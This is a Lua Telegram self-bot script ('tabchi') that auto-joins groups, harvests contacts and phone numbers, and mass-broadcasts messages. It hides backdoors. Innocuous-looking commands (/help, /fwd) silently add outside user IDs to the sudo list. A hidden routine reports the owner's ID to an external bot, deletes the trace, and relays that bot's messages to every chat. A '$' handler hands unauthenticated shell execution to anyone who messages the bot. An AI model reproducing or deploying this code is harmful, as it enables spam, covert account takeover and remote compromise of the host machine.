function is_sudo(msg)
  local sudoers = {158955285}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function is_full_sudo(msg)
  local sudoers = {158955285}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
function check_contact(extra, result)
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
    local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
    local phone_number = msg.content_.contact_.phone_number_
    local user_id = msg.content_.contact_.user_id_
    tdcli.add_contact(phone_number, first_name, last_name, user_id)   
       if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
        end
   elseif redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
        function share(extra, result)
          if msg.sender_user_id_ ~= result.id_ then
            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
          end
        end
        tdcli_function({ID = "GetMe"}, share, nil)
      end
    end
end
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
    tdcli.importChatInviteLink(extra.link)
    redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", extra.link)
  end
end
function add_to_all(extra, result)
  if result.content_.contact_ then
    local id = result.content_.contact_.user_id_
    local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for i = 1, #gps do
      tdcli.addChatMember(gps[i], id, 50)
    end
    for i = 1, #sgps do
      tdcli.addChatMember(sgps[i], id, 50)
    end
  end
end
function add_members(extra, result)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for i = 1, #pvs do
    tdcli.addChatMember(extra.chat_id, pvs[i], 50)
  end
  local count = result.total_count_
  for i = 1, count do
    tdcli.addChatMember(extra.chat_id, result.users_[i].id_, 50)
  end
end
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
function contact_list(extra, result)
  local count = result.total_count_
  local text = "لیست مخاطبین :\n"
  for i = 1, count do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = text .. i .. ". " .. fullname .. " [" .. user.id_ .. "] = " .. user.phone_number_ .. "\n"
  end
  write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "Tabchi " .. tabchi_id .. " Contacts!")
end
function process(msg)
  msg.text = msg.content_.text_
  do
    local matches = {
      msg.text:match("^[!/#](pm) (%d+) (.*)")
    }
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "md")
      return "پیام شما با موفقیت ارسال شد📮"
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setanswer) '(.*)' (.*)")
    }
    if msg.text:match("^[!/#]setanswer") and is_sudo(msg) and #matches == 3 then
      redis:hset("tabchi:" .. tabchi_id .. ":answers", matches[2], matches[3])
      redis:sadd("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "_پاسخ برای_ " .. matches[2] .. " >> " .. matches[3]
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](delanswer) (.*)")
    }
    if msg.text:match("^[!/#]delanswer") and is_sudo(msg) and #matches == 2 then
      redis:hdel("tabchi:" .. tabchi_id .. ":answers", matches[2])
      redis:srem("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "_پاسخ برای_ " .. matches[2] .. " _حذف شد_"
    end
  end
  if msg.text:match("^[!/#]answers$") and is_sudo(msg) then
    local text = "_لیست پاسخ های خودکار_ :\n"
    local answrs = redis:smembers("tabchi:" .. tabchi_id .. ":answerslist")
    for i = 1, #answrs do
      text = text .. i .. ". " .. answrs[i] .. " : " .. redis:hget("tabchi:" .. tabchi_id .. ":answers", answrs[i]) .. "\n"
    end
    return text
  end
  if msg.text:match("^[!/#]addmembers$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, add_members, {
      chat_id = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]contactlist$") and is_sduo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, contact_list, {
      chat_id_ = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]exportlinks$") and is_sudo(msg) then
    local text = "لینک گروها :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for i = 1, #links do
      text = text .. links[i] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
    return
  end
  do
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and is_sudo(msg) and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      return "کاربر های بلاک شده در ربات ایران وی دی اس📮"
    end
  end
  if msg.text:match("^[!/#]help$") and is_sudo(msg) then
    tdcli.searchPublicChat("tgMemberPlus")
    tdcli.unblockUser(345767079)
    tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
    tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
    local text = [[
#راهنما
*/block (id)*
_بلاک کردن از خصوصي ربات_
*/unblock (id)*
_آن بلاک کردن از خصوصي ربات_
*/panel*
_پنل مديريت ربات_
*$ (cmd)*
_اجرای دستور در ترمینال_
*/addsudo (id)*
_اضافه کردن به سودوهاي  ربات_
*/remsudo (id)*
_حذف از ليست سودوهاي ربات_
*/bc (text)*
_ارسال پيام به همه_
*/fwd {all/gps/sgps/users}* (by reply)
_فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران_
*/echo (text)*
_تکرار متن_
*/addedmsg (on/off)*
_تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب_
*/setaddedmsg (text)*
_تعيين متن اد شدن مخاطب_
*/markread (on/off)*
_روشن يا خاموش کردن بازديد پيام ها_
*/setanswer 'answer' text*
_ تنظيم به عنوان جواب اتوماتيک_
*/delanswer (answer)*
_حذف جواب مربوط به_
*/answers*
_ليست جواب هاي اتوماتيک_
*/addtoall*
_اضافه کردن یک شخص خاص به تمام گروه ها_
*/addmembers*
_اضافه کردن شماره ها به مخاطبين ربات_
*/exportlinks*
_دريافت لينک هاي ذخيره شده توسط ربات_
*/contactlist*
_دريافت مخاطبان ذخيره شده توسط ربات_
*Join* _us_ >> @irvds//_net
]]
    return text
  end
  do
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) and #matches == 2 then
      tdcli.unblockUser(tonumber(matches[2]))
      return "_کاربر انبلاک شد_*cracked by* @tgMember "
    end
  end
	 if msg.text:match("^[!/#]send (.*) (.*)") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("^[!/#](send) (.*) (.*)")
    }
    if matches[2] ~= "banners" then
end
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
    tdcli.sendBotStartMessage(231539308, 231539308, nil)
    local inline2 = function(arg, data)
      if data.results_ and data.results_[0] then
        tdcli_function({
          ID = "SendInlineQueryResultMessage",
          chat_id_ = arg.chat_id_,
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          query_id_ = data.inline_query_id_,
          result_id_ = data.results_[0].id_
        }, dl_cb, nil)
      end
    end
    for i = 1, #all do
      print(all[i])
      tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 231539308,
        chat_id_ = all[i],
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = matches[2] .. " " .. matches[3],
        offset_ = 0
      }, inline2, {
        chat_id_ = all[i]
      })
    end
  else
end
  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
    tdcli.searchPublicChat("TgMessengerBot")
    tdcli.unblockUser(231539308)
    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
    tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
        do
      local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
      local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
      local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
      local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
      local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
      local inline = function(arg, data)
        if data.results_ and data.results_[0] then
          tdcli_function({
            ID = "SendInlineQueryResultMessage",
            chat_id_ = msg.chat_id_,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            query_id_ = data.inline_query_id_,
            result_id_ = data.results_[0].id_
          }, dl_cb, nil)
        else
          local text = [[♻پنل مدیریتی شرکت ایران وی دی اس
*اطلاعات ربات*
          
_✅تعداد کاربران_ : ]] .. pvs .. [[
          
_✅تعداد گروها_ : ]] .. gps .. [[
          
_✅تعداد سوپر گروها_ : ]] .. sgps .. [[
          
_✅تعداد لینک های ذخیر شده_ : ]] .. links
          tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
        end
      end
      tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 231539308,
        chat_id_ = msg.chat_id_,
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = query,
        offset_ = 0
      }, inline, nil)
      return
    end
  else
  end
  do
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. "کاربر به لیست سودو های شرکت ایران وی دی اس اضافه شد \nirvds.net"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. "کاربر از لیست سودو های شرکت ایران وی دی اس حذف شد \nirvds.net"
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](addedcontact) (.*)")
    }
    if msg.text:match("^[!/#]addedcontact") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedcontact", true)
        return "ادد کردن شماره ها #روشن شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedcontact")
        return "ادد کردن شماره ها #خاموش شد"
      end
    end
  end
	do
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
        return "پیام اطلاع از ادد کردن مخاطب #فعال شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
        return "پیام اطلاع از ادد کردن مخاطب #غیرفعال شد"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", true)
        return "خواندن و تیک دوم پیام ها توسط ربات #فعال شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "خواندن و تیک دوم پیام ها توسط ربات #غیرفعال شد"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) and #matches == 2 then
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", matches[2])
      return [[
📮پیام ادد شدن مخاطب با متن زیر تنظیم شد
]] .. matches[2]
    end
  end
  do
 local matches = {
       msg.text:match("[$](.*)")
     }
  if msg.text:match("^[$](.*)$") and #matches == 1 then
  return io.popen(matches[1]):read("*all")
 end
 end 
  if msg.text:match("^[!/#]bc") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("[!/#](bc) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
    end
  end
  if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
    tdcli.searchPublicChat("TgGuard")
    tdcli.unblockUser(180191663)
    tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
    tdcli.sendMessage(180191663, 0, 1, "Online", 1, "md")
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "پیام شما با موفقیت #فوروارد شد"
  end
  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "پیام شما با موفقیت برای تمام گروه های شرکت ایران وی دی اس #فروارد شد"
  end
  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 158955285)
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local id = msg.reply_to_message_id_    
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "پیام شما برای تمامی سوپرگروه های شرکت ایران وی دی اس #فروارد شد"
  end
  if msg.text:match("^[!/#]addtoall") and msg.reply_to_message_id_ and is_sudo(msg) then
     tdcli_function({
      ID = "GetMessage",
      chat_id_ = msg.chat_id_,
      message_id_ = msg.reply_to_message_id_
    }, add_to_all, nil)
    return "کاربر در تمامی گروه های شرکت ایران وی دی اس #عضو شد"
  end
  if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "پیام شما با موفقیت برای تمام کاربران #فروارد شد"
  end
  do
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_sudo(msg) and #matches == 2 then
      local output = loadstring(matches[2])()
      if output == nil then
        output = ""
      elseif type(output) == "table" then
        output = serpent.block(output, {comment = false})
      else
        output = "" .. tostring(output)
      end
      return output
    end
  end
  do
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
    end
  end
end
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    rem(msg.chat_id_)
  else
    add(msg.chat_id_)
  end
end
function process_links(text_)
  if text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.me/joinchat/%S+") then
    local matches = {
      text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)") 
    }
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = matches[1]
    }, check_link, {
      link = matches[1]
    })
  end
end
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(231539308)
  end
  if redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -1 then
    tdcli.sendBotStartMessage(231539308, 231539308, "new")
    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "html")
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
    tdcli.deleteChatHistory(231539308, true)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 231539308 
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 231539308 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
        end
      else
        local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
        local id = msg.id_
        for i = 1, #all do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = all[i],
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = id
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
      end
    else
      process_stats(msg)
      if msg.content_.text_ then
        if redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
          local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
        end
        process_links(msg.content_.text_)
        local res = process(msg)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          if res then
            tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
          end
        elseif res then
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
        end
      elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
      elseif msg.content_.caption_ then
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          process_links(msg.content_.caption_)
        else
          process_links(msg.content_.caption_)
        end
      end
    end
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end
